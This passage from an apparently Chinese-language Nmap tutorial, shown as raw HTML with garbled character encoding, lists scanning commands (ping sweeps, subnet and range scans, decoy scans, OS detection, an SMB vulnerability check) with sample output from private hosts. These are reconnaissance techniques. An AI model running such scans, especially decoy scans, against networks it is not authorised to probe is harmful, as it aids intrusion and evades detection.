class="number">192.168</span><span class="number">.1</span>.* | grep open</span><br></pre></td></tr></table></figure><p><strong>3) åœ¨ç½‘ç»œå¯»æ‰¾æ‰€æœ‰åœ¨çº¿ä¸»æœº</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sP</span> 192<span class="selector-class">.168</span><span class="selector-class">.0</span>.*</span><br></pre></td></tr></table></figure><p>æˆ–è€…ä¹Ÿå¯ç”¨ä»¥ä¸‹å‘½ä»¤:</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP <span class="number">192.168</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure><p>æŒ‡å®š subnet</p><p><strong>4) Ping æŒ‡å®šèŒƒå›´å†…çš„ IP åœ°å€</strong></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP <span class="number">192.168</span><span class="number">.1</span><span class="number">.100</span><span class="number">-254</span></span><br></pre></td></tr></table></figure><p><strong>5) åœ¨æŸæ®µå­ç½‘ä¸ŠæŸ¥æ‰¾æœªå ç”¨çš„ IP</strong></p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-T4</span> <span class="selector-tag">-sP</span> <span class="selector-tag">192</span><span class="selector-class">.168</span><span class="selector-class">.2</span><span class="selector-class">.0</span>/<span class="selector-tag">24</span> <span class="selector-tag">&amp;</span><span class="selector-tag">&amp;</span> <span class="selector-tag">egrep</span> â€œ<span class="selector-tag">00</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span>â€³ /<span class="selector-tag">proc</span>/<span class="selector-tag">net</span>/<span class="selector-tag">arp</span></span><br></pre></td></tr></table></figure><p><strong>6) åœ¨å±€åŸŸç½‘ä¸Šæ‰«æ‰¾ Conficker è •è™«ç—…æ¯’</strong></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -PN -T4 -p139,<span class="number">445</span> -n -v â€“script=smb-check-vulns â€“script-args safe=<span class="number">1</span> <span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span><span class="number">-254</span></span><br></pre></td></tr></table></figure><p><strong>7) æ‰«æç½‘ç»œä¸Šçš„æ¶æ„æ¥å…¥ç‚¹ ï¼ˆrogue APsï¼‰.</strong></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p1<span class="number">-85</span>,<span class="number">113</span>,<span class="number">443</span>,<span class="number">8080</span><span class="number">-8100</span> -T4 â€“min-hostgroup <span class="number">50</span> â€“max-rtt-timeout</span><br><span class="line"><span class="number">2000</span> â€“initial-rtt-timeout <span class="number">300</span> â€“max-retries <span class="number">3</span> â€“host-timeout <span class="number">20</span>m</span><br><span class="line">â€“max-scan-delay <span class="number">1000</span> -oA wapscan <span class="number">10.0</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">8</span></span><br></pre></td></tr></table></figure><p><strong>8 ) ä½¿ç”¨è¯±é¥µæ‰«ææ–¹æ³•æ¥æ‰«æä¸»æœºç«¯å£</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">sudo</span> <span class="selector-tag">nmap</span> <span class="selector-tag">-sS</span> 192<span class="selector-class">.168</span><span class="selector-class">.0</span><span class="selector-class">.10</span> <span class="selector-tag">-D</span> 192<span class="selector-class">.168</span><span class="selector-class">.0</span><span class="selector-class">.2</span></span><br></pre></td></tr></table></figure><p><strong>9) ä¸ºä¸€ä¸ªå­ç½‘åˆ—å‡ºåå‘DNSè®°å½•</strong></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -R -sL <span class="number">209.85</span>.<span class="number">229.99</span>/<span class="number">27</span> | awk â€˜&#123;<span class="keyword">if</span>($3==â€<span class="keyword">not</span>â€)<span class="keyword">print</span>â€(â€œ$2â€³) <span class="keyword">no</span> PTRâ€;<span class="keyword">else</span> <span class="keyword">print</span>$3â€³ is â€œ$2&#125;â€™ | <span class="keyword">grep</span> â€˜(â€˜</span><br></pre></td></tr></table></figure><p><strong>10) æ˜¾ç¤ºç½‘ç»œä¸Šå…±æœ‰å¤šå°‘å° Linux åŠ Win è®¾å¤‡?</strong></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -F -O <span class="number">192.168</span>.<span class="number">0.1</span>-<span class="number">255</span> | <span class="keyword">grep</span> â€œRunning: â€ &gt; <span class="regexp">/tmp/</span>os; echo â€œ$(cat <span class="regexp">/tmp/</span>os | <span class="keyword">grep</span> Linux \</span><br><span class="line">| wc -l) Linux device(s)â€; echo â€œ$(cat <span class="regexp">/tmp/</span>os | <span class="keyword">grep</span> Windows | wc -l) Window(s) deviceâ€</span><br></pre></td></tr></table></figure><p>### </p><h3 id="1-ç”¨ä¸»æœºåå’ŒIPåœ°å€æ‰«æç³»ç»Ÿ"><a href="#1-ç”¨ä¸»æœºåå’ŒIPåœ°å€æ‰«æç³»ç»Ÿ" class="headerlink" title="1. ç”¨ä¸»æœºåå’ŒIPåœ°å€æ‰«æç³»ç»Ÿ"></a>1. ç”¨ä¸»æœºåå’ŒIPåœ°å€æ‰«æç³»ç»Ÿ</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> server2.tecmint.<span class="keyword">com</span>ï¼ˆ<span class="number">192.168</span>.<span class="number">0.101</span>ï¼‰</span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">15</span>:<span class="number">42</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.415</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure><h3 id="2-æ‰«æä½¿ç”¨â€œ-vâ€é€‰é¡¹"><a href="#2-æ‰«æä½¿ç”¨â€œ-vâ€é€‰é¡¹" class="headerlink" title="2.æ‰«æä½¿ç”¨â€œ-vâ€é€‰é¡¹"></a>2.æ‰«æä½¿ç”¨â€œ-vâ€é€‰é¡¹</h3><p>ä½ å¯ä»¥çœ‹åˆ°ä¸‹é¢çš„å‘½ä»¤ä½¿ç”¨â€œ <strong>-</strong>v â€œé€‰é¡¹åç»™å‡ºäº†è¿œç¨‹æœºå™¨æ›´è¯¦ç»†çš„ä¿¡æ¯ã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -v server2.tecmint.<span class="keyword">com</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">15</span>:<span class="number">43</span> EST</span><br><span class="line">Initiating ARP Ping Scan against <span class="number">192.168</span>.<span class="number">0.101</span> [<span class="number">1</span> port] at <span class="number">15</span>:<span class="number">43</span></span><br><span class="line">The ARP Ping Scan took <span class="number">0.01</span>s <span class="keyword">to</span> scan <span class="number">1</span> total hosts.</span><br><span class="line">Initiating SYN Stealth Scan against server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>) [<span class="number">1680</span> ports] at <span class="number">15</span>:<span class="number">43</span></span><br><span class="line">Discovered <span class="keyword">open</span> port <span class="number">22</span>/tcp <span class="keyword">on</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line">Discovered <span class="keyword">open</span> port <span class="number">80</span>/tcp <span class="keyword">on</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line">Discovered <span class="keyword">open</span> port <span class="number">8888</span>/tcp <span class="keyword">on</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line">Discovered <span class="keyword">open</span> port <span class="number">111</span>/tcp <span class="keyword">on</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line">Discovered <span class="keyword">open</span> port <span class="number">3306</span>/tcp <span class="keyword">on</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line">Discovered <span class="keyword">open</span> port <span class="number">957</span>/tcp <span class="keyword">on</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line">The SYN Stealth Scan took <span class="number">0.30</span>s <span class="keyword">to</span> scan <span class="number">1680</span> total ports.</span><br><span class="line">Host server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>) appears <span class="keyword">to</span> <span class="keyword">be</span> <span class="keyword">up</span> ... good.</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.485</span> seconds</span><br><span class="line">               Raw packets sen<span class="variable">t:</span> <span class="number">1681</span> (<span class="number">73.962</span>KB) | Rcvd: <span class="number">1681</span> (<span class="number">77.322</span>KB)</span><br></pre></td></tr></table></figure><h3 id="3-æ‰«æå¤šå°ä¸»æœº"><a href="#3-æ‰«æå¤šå°ä¸»æœº" class="headerlink" title="3.æ‰«æå¤šå°ä¸»æœº"></a>3.æ‰«æå¤šå°ä¸»æœº</h3><p>ä½ å¯ä»¥ç®€å•çš„åœ¨Nmapå‘½ä»¤ååŠ ä¸Šå¤šä¸ªIPåœ°å€æˆ–ä¸»æœºåæ¥æ‰«æå¤šå°ä¸»æœºã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> <span class="number">192.168</span>.<span class="number">0.101</span> <span class="number">192.168</span>.<span class="number">0.102</span> <span class="number">192.168</span>.<span class="number">0.103</span> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">06</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line">Nmap finished: <span class="number">3</span> IP addresses (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.580</span> seconds</span><br></pre></td></tr></table></figure><h3 id="4-æ‰«ææ•´ä¸ªå­ç½‘"><a href="#4-æ‰«ææ•´ä¸ªå­ç½‘" class="headerlink" title="4.æ‰«ææ•´ä¸ªå­ç½‘ *"></a>4.æ‰«ææ•´ä¸ªå­ç½‘ *</h3><p>ä½ å¯ä»¥ä½¿ç”¨*é€šé…ç¬¦æ¥æ‰«ææ•´ä¸ªå­ç½‘æˆ–æŸä¸ªèŒƒå›´çš„IPåœ°å€ã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> <span class="number">192.168</span>.<span class="number">0</span>.*</span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">11</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server1.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.100</span>):</span><br><span class="line">Not shown: <span class="number">1677</span> closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp  <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">111</span>/tcp <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">851</span>/tcp <span class="keyword">open</span>  unknown</span><br><span class="line"> </span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">256</span> IP addresses (<span class="number">2</span> hosts <span class="keyword">up</span>) scanned in <span class="number">5.550</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure><h3 id="5-ä½¿ç”¨IPåœ°å€çš„æœ€åä¸€ä¸ªå­—èŠ‚æ‰«æå¤šå°æœåŠ¡å™¨-ï¼Œ"><a href="#5-ä½¿ç”¨IPåœ°å€çš„æœ€åä¸€ä¸ªå­—èŠ‚æ‰«æå¤šå°æœåŠ¡å™¨-ï¼Œ" class="headerlink" title="5.ä½¿ç”¨IPåœ°å€çš„æœ€åä¸€ä¸ªå­—èŠ‚æ‰«æå¤šå°æœåŠ¡å™¨ ï¼Œ"></a>5.ä½¿ç”¨IPåœ°å€çš„æœ€åä¸€ä¸ªå­—èŠ‚æ‰«æå¤šå°æœåŠ¡å™¨ ï¼Œ</h3><p>ä½ å¯ä»¥ç®€å•çš„æŒ‡å®šIPåœ°å€çš„æœ€åä¸€ä¸ªå­—èŠ‚æ¥å¯¹å¤šä¸ªIPåœ°å€è¿›è¡Œæ‰«æã€‚ä¾‹å¦‚ï¼Œæˆ‘åœ¨ä¸‹é¢æ‰§è¡Œä¸­æ‰«æäº†IPåœ°å€192.168.0.101ï¼Œ192.168.0.102å’Œ192.168.0.103ã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> <span class="number">192.168</span>.<span class="number">0.101</span>,<span class="number">102</span>,<span class="number">103</span> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">09</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">3</span> IP addresses (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.552</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure><h3 id="6-ä»ä¸€ä¸ªæ–‡ä»¶ä¸­æ‰«æä¸»æœºåˆ—è¡¨-iL"><a href="#6-ä»ä¸€ä¸ªæ–‡ä»¶ä¸­æ‰«æä¸»æœºåˆ—è¡¨-iL" class="headerlink" title="6. ä»ä¸€ä¸ªæ–‡ä»¶ä¸­æ‰«æä¸»æœºåˆ—è¡¨ -iL"></a>6. ä»ä¸€ä¸ªæ–‡ä»¶ä¸­æ‰«æä¸»æœºåˆ—è¡¨ -iL</h3><p>å¦‚æœä½ æœ‰å¤šå°ä¸»æœºéœ€è¦æ‰«æä¸”æ‰€æœ‰ä¸»æœºä¿¡æ¯éƒ½å†™åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œé‚£ä¹ˆä½ å¯ä»¥ç›´æ¥è®©nmapè¯»å–è¯¥æ–‡ä»¶æ¥æ‰§è¡Œæ‰«æï¼Œè®©æˆ‘ä»¬æ¥çœ‹çœ‹å¦‚ä½•åšåˆ°è¿™ä¸€ç‚¹ã€‚</p><p>åˆ›å»ºä¸€ä¸ªåä¸ºâ€œnmaptest.txt â€çš„æ–‡æœ¬æ–‡ä»¶ï¼Œå¹¶å®šä¹‰æ‰€æœ‰ä½ æƒ³è¦æ‰«æçš„æœåŠ¡å™¨IPåœ°å€æˆ–ä¸»æœºåã€‚</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[root@server1 ~]</span># <span class="selector-tag">cat</span>  <span class="selector-tag">nmaptest</span><span class="selector-class">.txt</span> </span><br><span class="line"><span class="selector-tag">localhost</span></span><br><span class="line"><span class="selector-tag">server2</span><span class="selector-class">.tecmint</span><span class="selector-class">.com</span></span><br><span class="line">192<span class="selector-class">.168</span><span class="selector-class">.0</span><span class="selector-class">.101</span></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥è¿è¡Œå¸¦â€œiLâ€é€‰é¡¹çš„nmapå‘½ä»¤æ¥æ‰«ææ–‡ä»¶ä¸­åˆ—å‡ºçš„æ‰€æœ‰IPåœ°å€</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -iL nmaptest.txt </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">18</span> <span class="number">10</span>:<span class="number">58</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> localhost.localdomain (<span class="number">127.0</span>.<span class="number">0.1</span>):</span><br><span class="line">Not shown: <span class="number">1675</span> closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp  <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">25</span>/tcp  <span class="keyword">open</span>  smtp</span><br><span class="line"><span class="number">111</span>/tcp <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">631</span>/tcp <span class="keyword">open</span>  ipp</span><br><span class="line"><span class="number">857</span>/tcp <span class="keyword">open</span>  unknown</span><br><span class="line"> </span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">958</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems) </span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">958</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems) </span><br><span class="line">Nmap finished: <span class="number">3</span> IP addresses (<span class="number">3</span> hosts <span class="keyword">up</span>) scanned in <span class="number">2.047</span> seconds</span><br></pre></td></tr></table></figure><h3 id="7-æ‰«æä¸€ä¸ªIPåœ°å€èŒƒå›´"><a href="#7-æ‰«æä¸€ä¸ªIPåœ°å€èŒƒå›´" class="headerlink" title="7.æ‰«æä¸€ä¸ªIPåœ°å€èŒƒå›´ -"></a>7.æ‰«æä¸€ä¸ªIPåœ°å€èŒƒå›´ -</h3><p>ä½ å¯ä»¥åœ¨nmapæ‰§è¡Œæ‰«ææ—¶æŒ‡å®šIPèŒƒå›´ã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> <span class="number">192.168</span>.<span class="number">0.101</span>-<span class="number">110</span> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">09</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems) </span><br><span class="line">Nmap finished: <span class="number">10</span> IP addresses (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.542</span> 